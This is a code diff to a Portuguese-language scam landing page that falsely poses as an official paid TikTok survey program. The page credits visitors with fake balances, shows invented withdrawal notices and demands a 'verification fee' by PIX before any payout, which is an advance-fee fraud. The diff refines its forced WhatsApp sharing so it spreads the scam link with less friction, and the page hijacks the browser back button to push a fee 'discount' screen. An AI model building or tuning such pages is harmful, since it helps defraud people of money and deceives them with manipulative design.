@@ -450,7 +450,7 @@
             <span id="faq-icon-1" class="text-base font-black text-slate-400">+</span>
           </button>
           <div id="faq-answer-1" class="hidden p-4 text-xs text-slate-600 bg-white border-t border-slate-100 leading-relaxed">
-            Assim que a taxa única de verificação for confirmada via PIX, o valor total acumulado no seu saldo é enviado instantaneamente para a sua chave Pix cadastrada.
+            Assim que a taxa única de verificação foi confirmada via PIX, o valor total acumulado no seu saldo é enviado instantaneamente para a sua chave Pix cadastrada.
           </div>
         </div>
 
@@ -517,21 +517,21 @@
       { name: "Carla Mendes de Marabá", text: "sacou R$ 872,75" }
     ];
 
-    // --- LÓGICA DE COMPARTILHAMENTO DIRETO WHATSAPP ---
+    // --- LÓGICA DE COMPARTILHAMENTO DIRETO WHATSAPP (SEM CRIAR ABA EM BRANCO) ---
     function shareLink() {
       if (shareCount >= 3) return;
 
       const shareUrl = window.location.href;
       const shareText = "Olha esse programa oficial de pesquisas remuneradas do TikTok! Estou recebendo em tempo real no PIX: " + shareUrl;
 
-      // Abre diretamente a janela do WhatsApp em nova aba/app
       openWhatsApp(shareText);
     }
 
     function openWhatsApp(text) {
-      window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(text)}`, '_blank');
+      // Redireciona na mesma aba atual para evitar deixar abas "about:blank" abertas
+      window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(text)}`;
       
-      // Pequeno tempo de resposta (1.5s) para simular a saída e retorno do usuário do app do WhatsApp
+      // Como a página vai para o WhatsApp, simulamos o retorno do usuário após alguns segundos
       setTimeout(() => {
         registerShareBonus();
       }, 1500);
@@ -610,12 +610,10 @@
       history.pushState({ step: currentStep }, null, location.href);
       
       window.onpopstate = function (e) {
-        // Se estiver nas telas finais (vídeo de validação, cadastro pix ou tela pix) dispara o modal de desconto
         if (currentStep >= 7 || currentStep === 'discount') {
           history.pushState(null, null, location.href);
           showDiscountScreen();
         } else if (currentStep > 1) {
-          // Durante o questionário, apenas volta normalmente uma etapa sem pular para a tela final de desconto
           switchStep(currentStep - 1);
         } else {
           history.pushState(null, null, location.href);
@@ -650,7 +648,6 @@
       hasDiscountBeenApplied = true;
       const totalAmount = userBalance + 150.00;
       
-      // Atualiza textos na tela de cadastro de recebimento
       document.getElementById('fee-display-amount').textContent = "R$ 4,90";
       document.querySelectorAll('.total-balance-display').forEach(el => {
         el.textContent = totalAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
@@ -748,7 +745,6 @@
 
     function nextStep(targetStep, amount) {
       const currentQ = targetStep - 1;
-      // Garante que a recompensa dessa questão só seja somada uma vez
       if (!completedSteps[currentQ]) {
         userBalance += amount;
         completedSteps[currentQ] = true;
